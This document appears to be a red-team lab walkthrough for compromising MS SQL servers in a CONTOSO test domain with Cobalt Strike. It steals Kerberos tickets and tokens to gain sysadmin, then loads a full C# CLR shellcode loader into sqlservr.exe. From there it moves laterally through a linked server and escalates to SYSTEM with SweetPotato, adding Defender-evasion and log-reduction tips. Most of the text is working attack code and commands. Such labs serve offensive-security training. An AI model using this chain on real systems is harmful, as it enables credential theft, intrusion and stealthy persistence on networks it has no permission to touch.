# SQL Servers Lab

> **Objective:** Gain code execution, move laterally, and escalate privileges across MS SQL servers in the CONTOSO environment.

> **Attack path summary:** Enumerate SQL servers in AD → Find a low-priv user that can't exploit SQL → Find a high-priv user (sysadmin) via group membership → Impersonate that user using Kerberos tickets → Enable SQL CLR → Deploy a .NET assembly payload → Gain beacon inside SQL process → Pivot via SQL linked server to a second SQL host → Escalate to SYSTEM via SeImpersonatePrivilege.

---

# Enumeration

**Why this phase:** You need to identify what SQL servers exist, how they authenticate, and what privilege your current user has before attempting any exploitation. Going in blind wastes time and creates unnecessary noise.

1. Launch Cobalt Strike and connect to the team server.

2. Load the SQL-BOF Aggressor script.
    - Go to **Cobalt Strike > Script Manager**
    - Click **Load**
    - Select `C:\Tools\SQL-BOF\SQL\SQL.cna`

    > **Why:** SQL-BOF provides `sql-*` commands implemented as Beacon Object Files (BOFs). BOFs run directly inside the beacon thread — no child process is spawned. This makes all subsequent `sql-*` commands `OPSEC-SAFE`.

3. Interact with the medium-integrity Beacon and search for MS SQL servers configured for Kerberos authentication.

    ```
    ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
    ```

    > **Why:** LDAP is the authoritative source for SQL server discovery when Kerberos authentication is in use. SQL servers register a `MSSQLSvc/<hostname>:<port>` SPN under their service account in AD. This LDAP filter finds those accounts.  
    > The SPN value (`MSSQLSvc/lon-db-1.contoso.com:1433`) is also what you will use later when requesting Kerberos service tickets — note it now.  
    > `OPSEC-SAFE` — LDAP query uses existing domain connection inside the beacon.

4. Get information about the *lon-db-1* instance and your current privileges:

    ```
    sql-info lon-db-1
    sql-whoami lon-db-1
    ```

    > **Why:** `sql-info` reveals the SQL version, authentication mode (Windows = Kerberos), and any linked servers. `sql-whoami` tells you your current SQL login name and role.  
    > `OPSEC-SAFE` — SQL-BOF, no child process.

    > **Expected output:** You are authenticated as `pchilds` but only have `public/guest` privileges — not sysadmin. You cannot run CLR or xp_cmdshell with guest privileges. This tells you impersonation is needed.

5. Use domain enumeration to reveal principals that may have a sysadmin role on the SQL server. Search for SQL/DB/Database-named groups and their members.

    ```
    ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
    ```

    > **Why:** SQL sysadmin roles are often granted via AD security groups (e.g. a "SQL Admins" group whose members are granted sysadmin at the SQL level). By finding these groups and their membership, you identify which domain account you need to impersonate.  
    > `samAccountType=268435456` = security groups.  
    > `OPSEC-SAFE` — LDAP query only.

    > **Expected output:** A group that contains `rsteel` (or similar user) as a member. This user has sysadmin on lon-db-1.

6. Impersonate the *rsteel* user to gain sysadmin access on lon-db-1.

    > **Why:** rsteel has the sysadmin role on lon-db-1 — you need to authenticate to SQL as rsteel. SQL Server uses Windows authentication (Kerberos), so presenting rsteel's Kerberos ticket or access token will make the SQL server treat you as rsteel with full sysadmin.

    **First — check what Kerberos tickets are in memory and find rsteel's processes:**

    ```
    krb_triage
    process_browser
    ```

    > `krb_triage` lists all Kerberos tickets cached on this host. Look for rsteel's TGT (service: `krbtgt`).  
    > `process_browser` shows all running processes with their owner — look for any process running as rsteel.  
    > `OPSEC-SAFE` — BOF-based operations, no child process.

    **Option A — Steal rsteel's token from a running process (preferred when a process exists):**

    ```
    steal_token <pid>
    ```

    > Replace `<pid>` with the PID of a process owned by rsteel (found via `process_browser`).  
    > `steal_token` duplicates rsteel's Windows access token into your beacon. Network connections (including SQL auth) will use this token, making SQL see you as rsteel.  
    > `OPSEC-SAFE` — token theft is in-process, no new process spawned.

    **Option B — Kerberos ticket manipulation (when rsteel has no running process):**

    Dump rsteel's TGT from LSASS:

    ```
    krb_dump /user:rsteel /service:krbtgt
    ```

    > This extracts rsteel's TGT from the LSASS Kerberos cache as a base64-encoded .kirbi blob.  
    > `OPSEC-CAUTION` — accesses LSASS. Copy the entire base64 output from the beacon console.

    Use rsteel's TGT to request an MSSQLSvc service ticket for lon-db-1:

    ```
    krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[base64-TGT-from-above]
    ```

    > This asks the KDC for a service ticket encrypted for the SQL service account. When presented to lon-db-1, it proves you are rsteel — no password required.  
    > The SPN (`MSSQLSvc/lon-db-1.contoso.com:1433`) must match exactly what was returned in the LDAP SPN enumeration in step 3.

    Save the service ticket output to disk (run this as a PowerShell command in the beacon):

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\mssql.kirbi", [Convert]::FromBase64String("[base64-ST-output-from-above]"))
    ```

    Create a logon session and inject the ticket:

    ```
    make_token CONTOSO\rsteel FakePass
    kerberos_ticket_use C:\Users\Attacker\Desktop\mssql.kirbi
    run klist
    ```

    > `make_token` creates a Type 9 (NewCredentials) network logon session. The password `FakePass` is **never validated against AD** — Kerberos tickets override NTLM for network authentication. This is why a fake password works.  
    > `kerberos_ticket_use` injects the .kirbi service ticket into the beacon's Kerberos cache so the next SQL connection uses it.  
    > `run klist` confirms the ticket is loaded. You should see `MSSQLSvc/lon-db-1.contoso.com:1433` in the list.  
    > `OPSEC-CAUTION` — Event ID 4648 logged for the `make_token` operation.

7. Query your privileges on the SQL instance again and verify they have changed to sysadmin.

    ```
    sql-whoami lon-db-1
    ```

    > **Expected output:** You are now authenticated as rsteel with `sysadmin` role. You can now enable CLR and load assemblies.

---

# Code Execution

**Why this phase:** With sysadmin on lon-db-1, you want to run OS-level code inside the SQL process. SQL CLR loads a .NET assembly into `sqlservr.exe` memory — code executes inside the SQL process with no child process spawned. This is far stealthier than `xp_cmdshell`, which spawns `cmd.exe` as a direct child and is heavily signatured.

1. Check the status of SQL CLR.

    ```
    sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
    ```

    > **Why:** CLR must be enabled on the SQL instance before it will accept and run assemblies. You check first so you know whether enabling it is a change you're making (which is logged).  
    > `OPSEC-CAUTION` — querying `sys.configurations` is logged if SQL auditing is active.  
    > **Expected output:** `0` = disabled.

2. Enable SQL CLR on *lon-db-1*.

    ```
    sql-enableclr lon-db-1
    ```

    > **Why:** Required before you can load your .NET assembly. This sets `clr enabled = 1` in SQL Server configuration.  
    > `OPSEC-CAUTION` — configuration change is logged in SQL Server error log and `sys.configurations` history.

3. Generate x64 SMB Beacon shellcode.

    1. **Payloads > Windows Stageless Payload**
    2. Listener: **smb**
    3. Output: **Raw**
    4. Exit Function: **Thread**
    5. x64: ✓
    6. Click **Generate**
    7. Save to `C:\Payloads\smb_x64.xthread.bin`

    > **Why SMB listener:** The SQL server may not have a direct outbound network path to your team server. SMB named pipes work on TCP 445, which is often open internally. An SMB beacon connects back *to you* via a named pipe over SMB — you then link to it from a beacon that already has SMB access to that host.  
    > **Why Raw output:** The CLR DLL will embed this as raw shellcode bytes — no PE wrapper needed.  
    > **Why Thread exit function:** If set to Process, the exit kills `sqlservr.exe` — the SQL service crashes and generates a very noisy event. Thread exit terminates only the spawned thread; the SQL process keeps running.

4. Open Visual Studio and create a new Class Library (.NET Framework) project:
    1. Project name: `MyProcedure`
    2. Place in the same directory: ✓
    3. Framework: .NET Framework 4.7.2

    > **Why .NET Framework (not Core):** SQL Server's CLR runtime only supports .NET Framework assemblies — not .NET Core or .NET 5+. The version must be compatible with the SQL Server's CLR version.

5. Add `smb_x64.xthread.bin` as an embedded resource.

    > In Solution Explorer: right-click project → Add → Existing Item → select the `.bin` file  
    > Select the file → Properties panel → **Build Action: Embedded Resource**  
    > **Why embedded resource:** Bundles the shellcode *inside* the DLL binary so no separate file needs to be written to disk when the assembly executes. The shellcode is retrieved from the DLL's resource manifest at runtime.

6. Paste the following code into `StoredProcedures.cs`:

    ```c#
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
    using Microsoft.SqlServer.Server;
    
    public partial class StoredProcedures
    {
        [SqlProcedure]
        public static void MyProcedure()
        {
            var assembly = Assembly.GetExecutingAssembly();
    
            byte[] shellcode;
    
            // read embedded payload — name must match: <AssemblyName>.<filename>
            using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
            {
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
    
            // allocate RWX memory inside sqlservr.exe
            var hMemory = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);
    
            // copy shellcode into allocated memory
            WriteProcessMemory(
                new IntPtr(-1),
                hMemory,
                shellcode,
                (uint)shellcode.Length,
                out _);
    
            // execute shellcode in a new thread
            var hThread = CreateThread(
                IntPtr.Zero,
                0,
                hMemory,
                IntPtr.Zero,
                THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
                out _);
    
            // close the thread handle — thread continues running (beacon stays alive)
            CloseHandle(hThread);
        }
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            VIRTUAL_ALLOCATION_TYPE flAllocationType,
            PAGE_PROTECTION_FLAGS flProtect);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            THREAD_CREATION_FLAGS dwCreationFlags,
            out uint lpThreadId);
    
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool CloseHandle(IntPtr hObject);
    
        [Flags]
        public enum VIRTUAL_ALLOCATION_TYPE : uint
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x01000000,
            MEM_REPLACE_PLACEHOLDER = 0x00004000,
            MEM_LARGE_PAGES = 0x20000000,
            MEM_RESERVE_PLACEHOLDER = 0x00040000,
            MEM_FREE = 0x00010000,
        }
    
        [Flags]
        public enum PAGE_PROTECTION_FLAGS : uint
        {
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400,
        }
    
        [Flags]
        public enum THREAD_CREATION_FLAGS : uint
        {
            THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
            THREAD_CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
        }
    }
    ```

    > **What this code does:** When SQL Server calls `MyProcedure` as a stored procedure:
    > 1. Reads the embedded `.bin` shellcode from the DLL's resource manifest
    > 2. Allocates RWX (read/write/execute) memory inside `sqlservr.exe`
    > 3. Copies the shellcode bytes into that memory
    > 4. Spawns a thread pointing at the shellcode — this launches the SMB beacon
    > 5. Closes the thread handle (beacon keeps running as a detached thread)
    >
    > The beacon runs inside the `sqlservr.exe` process. No child process is created.  
    > `OPSEC-CAUTION` — `PAGE_EXECUTE_READWRITE` memory allocation is a behavioral detection indicator for many EDRs. In the exam, a custom artifact using indirect syscalls and RW→RX memory transitions is stealthier.  
    >
    > **Important:** The resource name in `GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin")` must match exactly — format is `<ProjectName>.<filename>`. A mismatch returns `null` and the procedure silently fails with a null reference exception.

    Build the project: **Build → Build Solution** (ensure Release mode is selected, not Debug)  
    Output: `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`

7. Load the CLR assembly on *lon-db-1* and execute the stored procedure.

    ```
    sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
    ```

    > **What SQL-BOF does here:** Reads the DLL from your attacker machine, uploads it to the SQL server, enables `TRUSTWORTHY` on the database (required for unsafe assemblies), registers the DLL as a CLR assembly, creates a stored procedure named `MyProcedure` that calls the .NET method, then executes it.  
    > `OPSEC-CAUTION` — `TRUSTWORTHY` database setting change is logged. The CLR assembly registration is visible in `sys.assemblies`. The stored procedure execution is logged if SQL auditing is active.  
    > The beacon will now be running inside `sqlservr.exe` on lon-db-1 as the SQL service account.

8. Link to the Beacon on lon-db-1.

    > **Why linking is needed:** The SMB beacon is not a reverse HTTP/HTTPS beacon — it does not call out to your team server. Instead, it creates an SMB named pipe and waits. You must connect *to it* from a beacon that has SMB access to lon-db-1. Linking creates the communication tunnel: `CS Team Server → your beacon → SMB pipe → SQL beacon`.

    > **Why this requires a CIFS ticket:** SMB named pipe authentication requires a valid `cifs/<hostname>` Kerberos service ticket. If your beacon session doesn't have one, the link will fail with `ERROR_LOGON_FAILURE`.

    **Option 1 — Run `link` from the pchilds' Beacon (simplest path):**

    From the original medium-integrity pchilds beacon:

    ```
    link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
    ```

    > `OPSEC-SAFE` — Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` ticket from the KDC before authenticating the SMB connection. No manual ticket work needed.  
    > The TSVCPIPE name is defined in your CS SMB listener. You can press TAB to autocomplete it.  
    > Run this from **pchilds' beacon**, not from any impersonated session — you need a valid TGT in the session to auto-request CIFS.

    **Option 2 — Manually request a CIFS ticket and inject it (when running from an impersonated context without a usable TGT):**

    Use rsteel's TGT (dumped earlier in the impersonation step) to request a CIFS ticket:

    ```
    krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
    ```

    > This asks the KDC for a `cifs/lon-db-1` service ticket using rsteel's TGT. Note: this is a **different** ticket from the MSSQLSvc ticket — SMB auth uses the `cifs` service class, not `MSSQLSvc`.

    Save the CIFS ticket to disk:

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[base64-output-from-krb_asktgs]"))
    ```

    Inject and link:

    ```
    kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
    run klist
    link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
    ```

    > `run klist` should show `cifs/lon-db-1.contoso.com` in the ticket list before you attempt to link.  
    > Delete the .kirbi file after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
    > `OPSEC-CAUTION` — .kirbi file written to disk temporarily.

9. Disable SQL CLR on *lon-db-1* after the beacon is linked.

    ```
    sql-disableclr lon-db-1
    ```

    > **Why:** Clean up. Reverting CLR to disabled reduces your footprint and removes the attack surface from future detection reviews.  
    > `OPSEC-SAFE` — configuration rollback.

---

# Lateral Movement

**Why this phase:** lon-db-1 has a SQL linked server relationship with lon-db-2. The link runs with credentials that have sysadmin on lon-db-2. You can use this to execute your CLR payload on lon-db-2 without your attacker machine having direct network access to lon-db-2 — the query tunnels through lon-db-1's SQL link.

1. Enumerate SQL links on *lon-db-1*.

    ```
    sql-links lon-db-1
    ```

    > **Why:** Reveals all linked server relationships configured on lon-db-1. Each link has a name, remote server address, and the credentials used by the link.

2. Verify your privileges on *lon-db-2* via *lon-db-1*.

    ```
    sql-whoami lon-db-1 "" lon-db-2
    ```

    > **Why:** Before attempting exploitation, confirm you have sysadmin on lon-db-2 via the link. The `""` second argument = no intermediate hop (direct link from lon-db-1 to lon-db-2).  
    > **Expected output:** sysadmin role on lon-db-2 — the link is configured with elevated credentials.

3. Check the status of RPC Out on the link.

    ```
    sql-checkrpc lon-db-1
    ```

    > **Why:** `EXECUTE AT linked_server` (which is how SQL-BOF runs CLR remotely) requires RPC Out to be enabled on the link. If disabled, you can query data through the link but cannot execute stored procedures (including CLR). Check before enabling so you know you're making a change.

4. Enable RPC Out on the link to *lon-db-2*.

    ```
    sql-enablerpc lon-db-1 lon-db-2
    ```

    > `OPSEC-CAUTION` — modifying link configuration is logged in SQL Server error log and visible in `sys.servers`. This is a detectable change.

5. Execute the SQL CLR payload on *lon-db-2* via *lon-db-1*.

    ```
    sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
    ```

    > **What happens:** SQL-BOF sends the CLR payload to lon-db-1, which then relays it to lon-db-2 via the SQL link using `EXECUTE AT [lon-db-2]`. The assembly is loaded and executed on lon-db-2.  
    > The beacon spawns inside `sqlservr.exe` on lon-db-2 as that server's MSSQL service account.  
    > The fourth argument `""` = no intermediate hop; fifth `lon-db-2` = target.

6. Link to the Beacon on *lon-db-2* — run this command from the **lon-db-1 beacon**.

    Interact with the lon-db-1 beacon in CS, then:

    ```
    link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
    ```

    > **Critical — why run from lon-db-1's beacon, not your attacker machine:**  
    > lon-db-2 is on a separate network segment. Firewall rules likely block direct SMB (TCP 445) from your attacker machine to lon-db-2. lon-db-1 is network-adjacent to lon-db-2 (the SQL link already proves connectivity on port 1433, and the server accounts have CIFS access to each other).  
    > By linking from lon-db-1's beacon, you build a chain: `CS Team Server ↔ Attacker beacon ↔ lon-db-1 SMB beacon ↔ lon-db-2 SMB beacon`.  
    > The lon-db-1 beacon runs as the MSSQL service account, which already has the necessary Kerberos credentials to authenticate to lon-db-2 via SMB.  
    > `OPSEC-SAFE` — SMB named pipe connection, no new process spawned.

7. Disable RPC on the link after the beacon is linked.

    ```
    sql-disablerpc lon-db-1 lon-db-2
    ```

    > **Why:** Clean up. Revert RPC Out to reduce your configuration footprint.

---

# Privilege Escalation

**Why this phase:** The beacon running inside `sqlservr.exe` on lon-db-2 is running as the MSSQL service account (`NT Service\MSSQLSERVER`). This account has `SeImpersonatePrivilege` enabled by design — SQL Server requires it to impersonate client connections. SweetPotato exploits this privilege to get a SYSTEM token and run an arbitrary process as SYSTEM.

1. Interact with the new Beacon running on *lon-db-2*.

2. Check the service account identity and token privileges.

    ```
    whoami
    ```

    > **Expected output:** `NT Service\MSSQLSERVER` (or similar SQL service account).  
    > The BOF output will include `SeImpersonatePrivilege: Enabled`.  
    > **Why this matters:** `SeImpersonatePrivilege` is the Potato family prerequisite. Any local service account with this privilege can impersonate SYSTEM via DCOM/COM authentication coercion.

3. Generate a TCP (localhost-only) executable payload.

    1. **Payloads > Windows Stageless Payload**
    2. Listener: **tcp-local**
    3. Output: Windows Executable
    4. Exit Function: Process
    5. x64: ✓
    6. Click **Generate**
    7. Save to `C:\Payloads\tcp-local_x64.exe`

    > **Why tcp-local:** lon-db-2 is on a separate network segment with no outbound path to your team server. `tcp-local` binds only to `127.0.0.1` — the beacon is reached via the existing beacon chain (lon-db-1's beacon connects to it locally on lon-db-2), not directly from your attacker machine.  
    > **Why Process exit:** After SweetPotato runs the EXE and the beacon connects back, the EXE can exit. The beacon communicates through the chain, not via this process.

4. Change Beacon's working directory to a writable location less likely to trigger AV.

    ```
    cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
    ```

    > **Why this directory:** The MSSQL service account has write access to its own service profile directory. `WindowsApps` within it is less aggressively monitored by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. The MSSQL service account owns this path so no permission errors.  
    > **Exam note:** In the exam, ensure your EXE is built with a custom artifact kit to avoid Defender static signatures on the binary.

5. Upload the tcp-local payload.

    ```
    upload C:\Payloads\tcp-local_x64.exe
    ```

    > `OPSEC-CAUTION` — file write to disk. Defender may flag the EXE. Custom artifact required in exam.

6. Execute the payload using SweetPotato to abuse SeImpersonatePrivilege.

    ```
    execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
    ```

    > **What SweetPotato does:**
    > 1. Creates a fake COM server on the local machine
    > 2. Coerces a privileged Windows service (SYSTEM) to authenticate to the fake COM server via DCOM
    > 3. Captures the SYSTEM authentication token using `SeImpersonatePrivilege`
    > 4. Calls `CreateProcessWithTokenW` to run your EXE under the impersonated SYSTEM token
    >
    > Result: `tcp-local_x64.exe` runs as `NT AUTHORITY\SYSTEM`.  
    > `OPSEC-CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). For the exam, ensure your malleable profile has `spawnto` set to a non-signatured binary (e.g. `dllhost.exe`).

7. Connect to the new SYSTEM beacon.

    ```
    connect localhost 1337
    ```

    > **Why localhost:** The tcp-local beacon bound to `127.0.0.1:1337` on lon-db-2. Since you are already running a beacon on lon-db-2 (the MSSQL one), `connect localhost 1337` reaches the SYSTEM beacon from within the same host.  
    > `OPSEC-SAFE` — loopback TCP connection, no external traffic.  
    > Port `1337` is defined in your `tcp-local` listener configuration.

---

<img src="/images/sql-servers-lab-graph-view.png" width=860>

> **Lab complete.** You have demonstrated: LDAP-based SQL server enumeration, Kerberos ticket impersonation to gain sysadmin, SQL CLR payload execution for code execution inside the SQL process, lateral movement via SQL linked servers across network segments, and privilege escalation from SQL service account to SYSTEM via SeImpersonatePrivilege.

<img src="/images/sql-servers-linked-lab-final-view.png" width=860>
